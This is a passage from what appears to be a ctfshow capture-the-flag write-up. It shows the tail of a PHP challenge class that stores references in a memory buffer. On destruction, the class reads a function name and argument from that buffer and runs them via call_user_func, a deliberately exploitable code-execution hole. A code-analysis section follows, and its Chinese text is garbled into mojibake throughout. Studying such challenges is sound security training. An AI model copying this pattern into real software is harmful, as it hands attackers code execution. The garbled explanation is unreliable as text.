</span></span><span class="line"><span class="cl">            <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nx">pack</span><span class="p">(</span><span class="s2">&#34;C&#34;</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cursor</span><span class="o">=</span> <span class="nx">ftell</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">clear</span><span class="p">(</span><span class="nv">$var</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">neaten</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">[</span><span class="s1">&#39;_clear_&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cursor</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$arr</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="s2">&#34;_clear_&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">),</span><span class="s2">&#34;C&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nx">sizeof</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span><span class="s1">&#39;C&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$arr</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="no">__NAMESPACE__</span><span class="o">.</span><span class="s2">&#34;\C::clear&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">),</span><span class="s2">&#34;C&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="mh">0x36d</span><span class="p">,</span><span class="s1">&#39;Q&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="s1">&#39;C&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span><span class="s1">&#39;C&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">readNeaten</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">rewind</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fseek</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">[</span><span class="s1">&#39;_clear_&#39;</span><span class="p">]</span><span class="o">+</span><span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$f</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">truncation</span><span class="p">(</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="o">-</span><span class="mi">4</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$t</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">truncation</span><span class="p">(</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="o">-</span><span class="mi">12</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$p</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">truncation</span><span class="p">(</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">define</span><span class="p">(</span><span class="nv">$ref</span><span class="p">,</span><span class="nv">$size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkRef</span><span class="p">(</span><span class="nv">$ref</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$r</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="nv">$ref</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">[</span><span class="nv">$ref</span><span class="p">]</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cursor</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$r</span> <span class="k">as</span> <span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">),</span><span class="s2">&#34;C&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nx">sizeof</span><span class="p">(</span><span class="nv">$r</span><span class="p">);</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span><span class="s1">&#39;C&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span><span class="nx">pack</span><span class="p">(</span><span class="s2">&#34;v&#34;</span><span class="p">,</span><span class="nv">$size</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span><span class="nx">pack</span><span class="p">(</span><span class="s2">&#34;C&#34;</span><span class="p">,</span><span class="mh">0x31</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cursor</span><span class="o">=</span> <span class="nx">ftell</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$size</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$ref</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="nv">$ref</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">\Exception</span><span class="p">(</span><span class="s2">&#34;Ref not exists!&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">[</span><span class="nv">$ref</span><span class="p">]</span><span class="o">!=</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">seekCursor</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">[</span><span class="nv">$ref</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">rewind</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nv">$cref</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$csize</span> <span class="o">=</span> <span class="nx">unpack</span><span class="p">(</span><span class="s2">&#34;v&#34;</span><span class="p">,</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="mi">2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$usize</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$val</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nv">$csize</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">truncation</span><span class="p">(</span><span class="nv">$val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">write</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span><span class="nv">$fmt</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span><span class="nx">pack</span><span class="p">(</span><span class="nv">$fmt</span><span class="p">,</span><span class="nv">$val</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cursor</span><span class="o">=</span> <span class="nx">ftell</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">seek</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">rewind</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fseek</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cursor</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">truncation</span><span class="p">(</span><span class="nv">$data</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">implode</span><span class="p">(</span><span class="nx">array_filter</span><span class="p">(</span><span class="nx">str_split</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span><span class="k">function</span><span class="p">(</span><span class="nv">$var</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$var</span><span class="o">!==</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">seekCursor</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">rewind</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fseek</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nv">$cursor</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">checkRef</span><span class="p">(</span><span class="nv">$ref</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$r</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="nv">$ref</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">sizeof</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">&gt;</span><span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">\Exception</span><span class="p">(</span><span class="s2">&#34;Refenerce size too long!&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkByte</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">0</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">\Exception</span><span class="p">(</span><span class="s2">&#34;Ref invalid!&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">array_shift</span><span class="p">(</span><span class="nv">$r</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$r</span> <span class="k">as</span> <span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkByte</span><span class="p">(</span><span class="nv">$s</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="nx">\Exception</span><span class="p">(</span><span class="s2">&#34;Ref invalid!&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">checkByte</span><span class="p">(</span><span class="nv">$check</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$check</span><span class="p">)</span> <span class="o">&lt;=</span><span class="nx">self</span><span class="o">::</span><span class="na">__REF_OFFSET_5</span> <span class="o">||</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$check</span><span class="p">)</span> <span class="o">&gt;=</span><span class="nx">self</span><span class="o">::</span><span class="na">__REF_OFFSET_2</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$check</span><span class="p">)</span> <span class="o">&gt;=</span><span class="nx">self</span><span class="o">::</span><span class="na">__REF_OFFSET_3</span> <span class="o">&amp;&amp;</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$check</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_OFFSET_4</span> 
</span></span><span class="line"><span class="cl">            <span class="o">&amp;&amp;</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$check</span><span class="p">)</span> <span class="o">!==</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_OFFSET_6</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;php://memory&#34;</span><span class="p">,</span><span class="s2">&#34;wb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">readNeaten</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fclose</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">C</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">main</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="1ä»£ç åˆ†æ">1.ä»£ç åˆ†æ</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¿™æ®µä»£ç å‘½åç©ºé—´ä¸ºctfshowï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªåä¸º C çš„ç±»ï¼Œå¹¶ä¸”åŒ…å«äº†ä¸€äº›å¸¸é‡å’Œæ–¹æ³•ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Cç±»ï¼š
</span></span><span class="line"><span class="cl">ç§æœ‰æˆå‘˜å˜é‡ $cursorï¼šè¡¨ç¤ºå½“å‰çš„ç¼“å†²åŒºæŒ‡é’ˆä½ç½®ã€‚
</span></span><span class="line"><span class="cl">$cache æˆå‘˜å˜é‡ï¼Œæ˜¯ä¸€ä¸ª PHP æ–‡ä»¶å¥æŸ„ï¼Œç”¨äºå­˜å‚¨å’Œè¯»å–æ•°æ®ã€‚
</span></span><span class="line"><span class="cl">å¸¸é‡ __REF_OFFSET_1 åˆ° __REF_OFFSET_6ï¼Œå€¼éƒ½æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œç”¨äºåé¢çš„ä¸€äº›æ“ä½œã€‚
</span></span><span class="line"><span class="cl">__REF_SIZE__ å’Œ __REF_VAL_SIZE__ï¼Œåˆ†åˆ«è¡¨ç¤ºå¼•ç”¨çš„å¤§å°å’Œå€¼çš„å¤§å°ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">main()æ–¹æ³•ä» /flag æ–‡ä»¶ä¸­è¯»å– MD5 å€¼ï¼Œå¹¶é€šè¿‡ define æ–¹æ³•å®šä¹‰äº†ä¸¤ä¸ªå¼•ç”¨ ctfshow å’Œ flagï¼Œåˆ†åˆ«å¯¹åº”ç”¨æˆ· POST è¯·æ±‚ä¸­çš„ data å’Œæ–‡ä»¶ MD5 å€¼ã€‚ç„¶åå®ƒé€šè¿‡ fill æ–¹æ³•å‘ç¼“å†²åŒºä¸­å¡«å†™æ•°æ®ã€‚æœ€åï¼Œé€šè¿‡ read æ–¹æ³•æ¯”è¾ƒä¸¤ä¸ªå¼•ç”¨çš„å€¼ï¼Œå¦‚æœç›¸ç­‰å°±è¾“å‡º flagã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">define()æ–¹æ³•æ£€æŸ¥å¼•ç”¨çš„é•¿åº¦æ˜¯å¦è¶…è¿‡é™åˆ¶ï¼Œå¹¶å°†å¼•ç”¨çš„åç§°å’Œå¤§å°å†™å…¥ç¼“å†²åŒºã€‚ç„¶åå¡«å†™ä¸€ä¸ªå­—èŠ‚çš„ 0x31 å’Œå¼•ç”¨çš„å€¼çš„å¤§å°ï¼Œä»¥åŠä¸€ä¸ªæŒ‡å‘æ•°æ®çš„æŒ‡é’ˆã€‚è¿™ä¸ªæ–¹æ³•è¿˜ä¼šåœ¨ç¼“å†²åŒºä¸­åˆ†é…ä¸€æ®µç©ºé—´ç”¨äºå­˜å‚¨å¼•ç”¨çš„å€¼ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">fill()æ–¹æ³•ä¼šå°†æ•°æ®å†™å…¥ç¼“å†²åŒºï¼Œå¹¶ç”¨ 0x00 å¡«å……ç¼“å†²åŒºçš„å‰©ä½™éƒ¨åˆ†ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">read()æ–¹æ³•ä¼šè¯»å–æŒ‡å®šå¼•ç”¨çš„å€¼ï¼Œå¹¶è¿”å›ã€‚å®ƒä¼šæ£€æŸ¥å¼•ç”¨æ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä»ç¼“å†²åŒºä¸­è¯»å–å¼•ç”¨çš„å€¼å’Œå¤§å°ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">neaten()æ–¹æ³•ä¼šåœ¨ç¼“å†²åŒºä¸­åˆ›å»ºä¸€ä¸ª _clear_ çš„å¼•ç”¨å’Œä¸€ä¸ªæŒ‡å‘ C::clear æ–¹æ³•çš„æŒ‡é’ˆï¼Œå®ƒè¿˜ä¼šå†™å…¥ä¸€äº›ç©ºå­—èŠ‚ç”¨äºå¯¹é½ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">readNeaten()æ–¹æ³•ä¼šä»ç¼“å†²åŒºä¸­è¯»å– _clear_ çš„å€¼ï¼Œå¹¶è°ƒç”¨ C::clear æ–¹æ³•ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">write()æ–¹æ³•ä¼šå°†æŒ‡å®šå€¼å†™å…¥ç¼“å†²åŒºï¼Œå¹¶æ›´æ–°ç¼“å†²åŒºçš„æŒ‡é’ˆä½ç½®ã€‚
</span></span><span class="line"><span class="cl">
